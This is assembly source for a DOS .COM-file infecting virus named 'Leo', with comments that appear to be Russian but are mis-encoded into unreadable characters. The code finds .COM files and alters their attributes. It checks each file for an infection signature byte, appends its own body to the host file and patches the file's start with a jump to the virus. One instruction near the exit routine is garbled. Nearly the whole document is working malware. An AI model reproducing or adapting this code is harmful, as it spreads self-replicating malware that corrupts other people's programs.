.286 
.model tiny
CheckByte equ 0F0H

;[����뢠��, �� ॣ����� CS � DS ᮤ�ঠ�
;���� ᥣ���� ���� �ணࠬ��
assume cs:code, ds:code 

code segment
org 100h 
start: 
;�����㥬 ��ࠦ���� ���-䠩�.
;���� ����� ��稭����� � ��⪨ la
; jmp la 
	db 1 dup(0E9H) ;��� ������� JMP 
	dw offset la-offset real
real: 
mov ah,4Ch
int 21h 
;3���� ��稭����� ⥫� �����
la: 
	pushf
	pusha
	push ds 
	push es 

;����砥� ��� �室�. 
;��� �⮣� ��뢠�� ����ணࠬ�� (᫥���騩 
;�� �맮��� ����) � �⠥� �� �⥪� ���� ������ 

	call MySelf
MySelf: 

	pop bp 

;����⠭�������� ���� �� ���� ��室��� �ணࠬ��
	mov al,[bp+(offset bytes_3[0]-offset MySelf)]
	mov byte ptr cs:[100h],al
	mov al,[bp+(offset bytes_3[1]-offset MySelf)]
	mov byte ptr cs:[101h],al
	mov al,[bp+(offset bytes_3[2]-offset MySelf)]
	mov byte ptr cs:[102h],al 

;���쭥��� ����� ����� - ���� ����� �����. 
;��� �⮣� �ᯮ������ �㭪�� 4Eh (���� ���� 䠩�). 
;�饬 䠩� � ��묨 ��ਡ�⠬� 
Find_First: 

;�饬 ���� 䠩� �� 蠡���� �����
	mov ah,4Eh 
        mov dx,offset fname-offset myself
	add dx,bp 
	mov cx,00100111b
	int 21h 
;�᫨ 䠩� ������ - ���室�� � ᬥ�� ��ਡ�⮢, ���� ��室��
;�� ����� (����� ��� ���室��� ��� ��ࠦ���� 䠩���) 
	jnc attributes 
        jmp exit
attributes: 
;��⠥� �ਣ������ ��ਡ��� 䠩��
	mov ax,4300h 
        mov dx,9Eh 	;���� ����� 䠩��
	int 21h 
;���࠭塞 �ਣ������ ��ਡ��� 䠩��
	push cx 
;��⠭�������� ���� ��ਡ��� 䠩��
	mov ax,4301h 
        mov dx,9Eh ;���� ����� 䠩��
	mov cx,20h
	int 21h 
;���室�� � ������ 䠩��
	jmp Open 
;�饬 ᫥���騩 䠩�, ⠪ ��� �।��騩 �� ���室��
Find_Next: 

;����⠭�������� �ਣ������ ��ਡ��� 䠩��
	mov ax,4301h 
        mov dx,9Eh ;���� ����� 䠩��
	pop cx
	int 21h 
;����뢠�� 䠩�
	mov ah,3Eh
	int 21h 
;�饬 ᫥���騩 䠩�
	mov ah,4Fh
	int 21h 
;�᫨ 䠩� ������ - ���室�� � ᬥ�� ��ਡ�⮢, ���� ��室��
;�� ����� (����� ��� ���室��� ��� ��ࠦ���� 䠩���) 
	jnc attributes 
        jmp exit 
;���뢠�� 䠩�
Open: 
        mov ax,3D02h 
        mov dx,9Eh 
        int 21h 
;�᫨ �� ����⨨ 䠩�� �訡�� �� �ந��諮 -
;���室�� � �⥭��, ���� ��室�� �� ����� 
	jnc See_Him 
        jmp exit 

;��⠥� ���� ���� 䠩��
See_Him: 
        xchg bx,ax 
        mov ah,3Fh 
        mov dx,offset buf-offset myself 
        add dx,bp 
        xor cx,cx 	;CX=0 
        inc cx 		;[(㢥��祭�� �� 1) ��=1 
        int 21h 

;�ࠢ������. �᫨ ���� ���� 䠩�� 
;�� E9h, � ���室�� � ����� ᫥���饣� 䠩�� - 
;��� ��� ��ࠦ���� �� ���室�� 
	cmp byte ptr [bp+(offset buf-offset myself )],0E9H
        jne find_next 

; ���室�� � ��砫� 䠩��
	mov ax,4200h	
	xor cx,cx
	xor dx,dx
	int 21h 
;��⠥� ���� �� ���� 䠩�� � ⥫� �����
See_Him2: 
	mov ah,3Fh 
	mov dx,offset bytes_3-offset myself 
        add dx,bp 
        mov cx,3 
        int 21h 
;����砥� ����� 䠩��, ��� 祣� ���室�� � ����� 䠩��
Testik: 
 	mov ax,4202h 
        xor cx,cx 
        xor dx,dx 
        int 21h
Size_test: 

;���࠭塞 ����祭��� ����� 䠩�� 
        mov [bp+(offset flen-offset MySelf)],ax 
;�஢��塞 ����� 䠩��
	cmp ax,64000 
;�᫨ 䠩� �� ����� 64000 ����,- ���室�� 
;� ᫥���饩 �஢�થ, 
;���� �饬 ��㣮� 䠩� (��� ᫨誮� ����� ��� ��ࠦ����) 
	jna richJest 
        jmp find_next 
;�஢�ਬ, �� ��ࠦ�� �� 䠩�.
;��� �⮣� �஢�ਬ ᨣ������ �����
RichJest: 

;���室�� � ����� 䠩�� (�� ��᫥���� ����)
	mov ax,4200h
	xor cx,cx 
        mov dx,[bp+(offset flen-offset MySelf)]
	dec dx
	int 21h 

;��⠥� ᨣ������ �����
Read: 
        mov ah,3Fh 
        xor cx,cx 
        inc cx 
        mov dx,offset bytik-offset myself 
        add dx,bp
	int 21h 

;�᫨ �� �⥭�� 䠩�� �訡�� 
;�� �ந��諮 - �஢��塞 ᨣ������, 
;���� �饬 ᫥���騩 䠩� 

	jnc test_bytik 
        jmp find_next 
;�஢��塞 ᨣ������
Test_bytik: 
        cmp byte ptr [bp+(offset bytik-offset myself )],CheckByte 

;�᫨ ᨣ����� ����, � �饬 ��㣮� 䠩�,
;�᫨ ��� - �㤥� ��ࠦ��� 

	jne NotJnfected 
        jmp find_next 

;���� �� ��ࠦ�� - �㤥� ��ࠦ���
NotJnfected: 

	mov ax,[bp+(offset flen-offset myself)] 
        sub ax,03h 
        mov [bp+(offset jmp_cmd-offset myself)],ax
l_am_copy: 

;���室�� � ����� 䠩��
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h 
;��⠭�������� ॣ���� DS �� ᥣ���� ����
	push cs
	pop ds 
;�����㥬 ����� � 䠩�
	mov ah,40h 
        mov cx,offset VirEnd-offset la
	mov dx,bp 
        sub dx,offset myself-offset la
	int 21h 
;�����뢠�� � ��砫� 䠩�� ���室 �� ⥫� �����
Write_Jmp: 

;���室�� � ��砫� 䠩��
	xor cx,cx	
	xor dx,dx
	mov ax,4200h
	int 21h 
;�����뢠�� ���� �� ���� 䠩�� (���室 �� ⥫� �����)
	mov ah,40h
	mov cx,3 
	mov dx,offset jmpvir-offset myself
	add dx,bp
	int 21h 
;3���뢠�� 䠩�
Close: 
        mov ah,3Eh 
        int 21h 
;����⠭�������� �ਣ������ ��ਡ��� 䠩�� 

	mov ax,4301h 
        mov dx,9Eh 
        pop cx 
        int 21h
exit: 
;����⠭�������� ��ࢮ��砫�� ���祭�� ॣ���஢ � 䫠���
	pop es 
	pop ds
	��
	popf 
;��।��� �ࠢ����� �ணࠬ��-���⥫�
	push 100h
	retn 

;���� ��� �⥭�� ᨣ������
	bytik db (?) 
;��१�ࢨ஢��� ��� ��������� ��� ���� �����
	jmpvir db 0E9H
	jmp_cmd dw (?) 

;����� 䠩��
	flen dw (?) 

;������ ��� ���᪠ 䠩���
	fname db "*.com",0 

;0������ ��� �࠭���� ������� ���室�
	bytes_3 db 90h, 90h, 90h 

;���� ����� ��� �⥭�� ��ࢮ�� ���� 䠩��
;� 楫�� �஢�ન (�9�)
	buf db (?) 

;�������� �����
	virus_name db "Leo" 

;�������� 

	a db CheckByte 
VirEnd: 
code ends 
end start 

